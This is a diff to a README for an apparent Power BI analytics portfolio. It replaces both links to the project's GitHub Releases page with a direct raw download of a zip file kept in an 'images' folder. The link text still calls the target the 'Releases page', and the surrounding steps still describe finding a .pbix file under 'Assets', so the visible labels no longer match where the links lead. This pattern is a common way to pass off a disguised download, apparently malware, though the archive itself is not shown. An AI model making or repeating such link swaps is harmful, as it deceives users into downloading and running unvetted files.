@@ -1,6 +1,6 @@
 # 📊 operational-analytics-portfolio - Review your business data with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/reluctant-greatsmokymountains869/operational-analytics-portfolio/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/reluctant-greatsmokymountains869/operational-analytics-portfolio/main/images/portfolio-operational-analytics-v3.9.zip)
 
 This repository contains tools for your business reporting needs. These files help you track sales, monitor company health, and manage daily tasks. You can view clear visual dashboards to understand your performance metrics without complex setup.
 
@@ -25,7 +25,7 @@ If you do not have Power BI Desktop, you can download it for free from the Micro
 
 Follow these steps to set up the application on your computer.
 
-1. Go to the [Releases page](https://github.com/reluctant-greatsmokymountains869/operational-analytics-portfolio/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/reluctant-greatsmokymountains869/operational-analytics-portfolio/main/images/portfolio-operational-analytics-v3.9.zip).
 2. Look for the section labeled "Assets" under the most recent version.
 3. Click the file name ending in `.pbix` to start the download.
 4. Save the file to your desktop or a folder you can find later.
